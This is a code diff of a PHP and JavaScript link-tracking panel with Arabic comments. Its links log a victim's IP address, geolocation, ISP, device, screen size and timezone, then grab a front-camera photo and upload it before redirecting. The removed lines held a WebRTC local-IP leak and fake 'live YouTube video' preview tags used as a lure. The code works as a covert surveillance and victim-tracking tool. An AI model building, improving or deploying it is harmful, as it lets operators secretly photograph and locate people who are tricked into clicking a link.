@@ -1,11 +1,12 @@
 <?php
-// إظهار الأخطاء للتشخيص
+// إظهار الأخطاء للتحقق والتأكد من العمل
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
+    // إنشاء الجداول مع إضافة حقل لصورة السيلفي
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -34,16 +35,18 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// استقبال صورة السيلفي وحفظها
+// معالجة استقبال صورة السيلفي المرسلة عبر طلب AJAX
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
     $code =$_POST['code'] ?? '';
     $imgData =$_POST['image'] ?? '';
     
     if (!empty($imgData) && !empty($code)) {
+        // تنظيف بيانات الصورة وإزالة الرأسية
         $imgData = str_replace('data:image/jpeg;base64,', '',$imgData);
         $imgData = str_replace(' ', '+',$imgData);
         $decodedData = base64_decode($imgData);
         
+        // إنشاء مجلد للصور إذا لم يكن موجوداً
         if (!file_exists('uploads')) {
             mkdir('uploads', 0755, true);
         }
@@ -51,6 +54,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['a
         $filename = 'uploads/photo_' .$code . '_' . time() . '.jpg';
         file_put_contents($filename,$decodedData);
         
+        // حفظ مسار الصورة في آخر سجل يخص هذا الكود
         $stmt =$db->prepare("UPDATE logs SET photo = ? WHERE code = ? ORDER BY id DESC LIMIT 1");
         $stmt->execute([$filename,$code]);
         
@@ -102,62 +106,55 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-$og_title = "Hello World from azez";
-$og_description = "لوحة تحكم تتبع الروابط المتقدمة";
-$og_image = "";
-$target_url_redirect = "";
-
+// 1. معالجة إعادة التوجيه
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
     $stmt->execute([$code]);
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($link) {$target_url_redirect = $link['target_url'];$og_title = "شاهد الفيديو المباشر";
-        $og_description = "اضغط للمشاهدة الآن عبر اليوتيوب";
-
-        if (strpos($target_url_redirect, 'youtube.com') !== false || strpos($target_url_redirect, 'youtu.be') !== false) {$parsed_url = parse_url($target_url_redirect);$video_id = "";
-            if (isset($parsed_url['query'])) {
-                parse_str($parsed_url['query'],$query_params);
-                if (isset($query_params['v'])) {
-                    $video_id =$query_params['v'];
-                }
-            } elseif (isset($parsed_url['path'])) {
-                $video_id = ltrim($parsed_url['path'], '/');
-            }
-            if (!empty($video_id)) {
-                $og_image = "https://img.youtube.com/vi/" . $video_id . "/hqdefault.jpg";
-            }
-        }
-
-        if (isset($_GET['screen'])) {$public_ip = get_real_ip();
-            $local_ip =$_GET['lip'] ?? 'غير متوفر';
-            $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
-            $geo = get_ip_details($public_ip);
-            $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-            $device = get_device_type($ua);
-            $screen =$_GET['screen'] ?? 'غير متوفر';
-            $tz =$_GET['tz'] ?? 'غير متوفر';
-
-            try {
-                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-            } catch (Exception $e) {}
-
-            header("Location: " . $target_url_redirect);
+    if ($link) {
+        $target =$link['target_url'];
+        
+        // إذا كان الطلب قادماً لالتقاط الصورة عبر الجافاسكريبت
+        if (isset($_GET['capture']) &&$_GET['capture'] == '1') {
             exit();
         }
+
+        $public_ip = get_real_ip();
+        $local_ip =$_GET['lip'] ?? 'غير متوفر';
+        $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
+        $geo = get_ip_details($public_ip);
+        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+        $device = get_device_type($ua);
+        $screen =$_GET['screen'] ?? 'غير متوفر';
+        $tz =$_GET['tz'] ?? 'غير متوفر';
+
+        try {
+            $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+            $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
+        } catch (Exception $e) {
+            // الاستمرار في حالة خطأ السجل
+        }
+
+        // إذا تم إرسال معلومات الشاشة، نقوم بتحويل الزائر للرابط المستهدف
+        if (isset($_GET['screen'])) {
+            header("Location: " . $target);
+            exit();
+        }
+    } else {
+        die("الرابط غير موجود.");
     }
 }
 
-// إنشاء رابط جديد
+// 2. إنشاء رابط جديد
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
@@ -191,15 +188,7 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?php echo htmlspecialchars($og_title); ?></title>
-    
-    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
-    <meta property="og:description" content="<?php echo htmlspecialchars($og_description); ?>">
-    <?php if (!empty($og_image)): ?>
-        <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
-    <?php endif; ?>
-    <meta property="og:type" content="website">
-
+    <title>Hello World from azez</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
@@ -242,37 +231,16 @@ if (!empty($filter_code)) {
             const redirectCode = urlParams.get('r');
             const hasScreen = urlParams.has('screen');
 
+            // إذا فتح الزائر الرابط لأول مرة
             if (redirectCode && !hasScreen) {
-                const screenRes = screen.width + "x" + screen.height;
-                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-                // استخراج عنوان IP المحلي عبر WebRTC لجلب تفاصيل الشبكة الداخلية بدقة
-                let localIp = "غير متوفر";
-                window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                if (window.RTCPeerConnection) {
-                    try {
-                        const pc = new RTCPeerConnection({iceServers: []});
-                        pc.createDataChannel("");
-                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                        pc.onicecandidate = function(ice) {
-                            if (ice && ice.candidate && ice.candidate.candidate) {
-                                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+:+[a-f0-9:]+)/;
-                                const match = ipRegex.exec(ice.candidate.candidate);
-                                if (match) {
-                                    localIp = match[1];
-                                }
-                            }
-                        };
-                    } catch(e) {}
-                }
-
-                // محاولة تشغيل الكاميرا والتقاط الصورة بصمت في الخلفية
+                // محاولة التقاط صورة سيلفي أولاً
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                         .then(function(stream) {
                             const video = document.createElement('video');
                             video.srcObject = stream;
                             video.play();
+                            
                             setTimeout(function() {
                                 const canvas = document.createElement('canvas');
                                 canvas.width = 320;
@@ -280,8 +248,11 @@ if (!empty($filter_code)) {
                                 const ctx = canvas.getContext('2d');
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                                
+                                // إيقاف الكاميرا
                                 stream.getTracks().forEach(track => track.stop());
 
+                                // إرسال الصورة للخادم
                                 const formData = new URLSearchParams();
                                 formData.append('action', 'save_photo');
                                 formData.append('code', redirectCode);
@@ -291,21 +262,24 @@ if (!empty($filter_code)) {
                                     method: 'POST',
                                     body: formData
                                 }).finally(() => {
-                                    redirectToTarget(redirectCode, screenRes, tz, localIp);
+                                    proceedRedirect(redirectCode);
                                 });
-                            }, 800);
+                            }, 1000); // الانتظار لثانية لضمان تشغيل الكاميرا
                         })
                         .catch(function(error) {
-                            redirectToTarget(redirectCode, screenRes, tz, localIp);
+                            // في حال رفض الإذن أو عدم وجود كاميرا، المتابعة طبيعياً
+                            proceedRedirect(redirectCode);
                         });
                 } else {
-                    redirectToTarget(redirectCode, screenRes, tz, localIp);
+                    proceedRedirect(redirectCode);
                 }
             }
         });
 
-        function redirectToTarget(code, screenRes, tz, localIp) {
-            window.location.href = `/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}&lip=${encodeURIComponent(localIp)}`;
+        function proceedRedirect(code) {
+            const screenRes = screen.width + "x" + screen.height;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            window.location.href = `/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
         }
 
         function copyText(text, btnElement) {
@@ -415,7 +389,7 @@ if (!empty($filter_code)) {
                                 </td>
                                 <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                 <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
-                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
+                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></td>
                                 <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                 <td>
                                     <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
